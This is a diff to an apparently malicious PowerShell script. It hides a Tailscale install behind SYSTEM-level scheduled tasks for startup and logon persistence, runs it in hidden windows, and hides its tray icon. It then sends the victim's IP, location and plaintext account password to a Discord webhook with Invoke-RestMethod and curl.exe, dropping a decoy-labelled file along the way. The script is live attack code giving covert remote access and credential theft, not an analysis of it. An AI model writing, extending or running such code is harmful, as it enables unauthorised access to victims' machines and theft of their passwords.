@@ -38,11 +38,19 @@ function installTailscale {
   ## Adds Tailscale to task scheduler
   $name = "Tailscale"
   $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscaled.exe"
-  $trigger = New-ScheduledTaskTrigger -AtStartup
+  $trigger = New-ScheduledTaskTrigger -AtStartup 
   $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
   $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun -AllowStartIfOnBatteries -StartWhenAvailable
 
   if (Get-ScheduledTask $name -ErrorAction SilentlyContinue) {Unregister-ScheduledTask $name} 
+  Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Tailscale Service, Preinstalled for Windoes"
+  Write-Output "Start-Process -FilePath 'C:\Tailscale\tailscale.exe' -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
+    if (Get-ScheduledTask 'Tailscale Configuration' -ErrorAction SilentlyContinue) {Unregister-ScheduledTask 'Tailscale Configuration'}" >> C:\Tailscale\tailscalesetup.ps1
+  $name = "Tailscale Configuration"
+  $action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "C:\Tailscale\tailscalesetup.ps1"
+  $trigger = New-ScheduledTaskTrigger -AtLogOn 
+  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
+  $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun -AllowStartIfOnBatteries -StartWhenAvailable
   Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Tailscale Service, Preinstalled for Windoes"
 }
 
@@ -220,8 +228,10 @@ Set-Location $PSScriptRoot
 Start-Sleep 5
 removeIcon -ProgramPath "C:\Tailscale\tailscale-ipn.exe" -Hide 
 # FIXME: Configure Tailscale on target pc right 
+Set-Location C:\Tailscale\
 Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
 Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
+Set-Location $temp\$dirName
 
 ## Sends Discord Webhook
 $description = 
@@ -233,7 +243,7 @@ Computer Language = $language
 Location (country) = $country
 IP = $ip
 Account Password = $pwordClear"
-New-Item ./$env:computername.fk -Value ( $ip,$pwordClear,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine )
+New-Item ./$env:computername.fk -Value ( " " + $ip," " + $pwordClear,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine )
 $payload = [PSCustomObject]@{content=$description}
 Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
 curl.exe -F "file1=@./$env:computername.fk" $Webhook
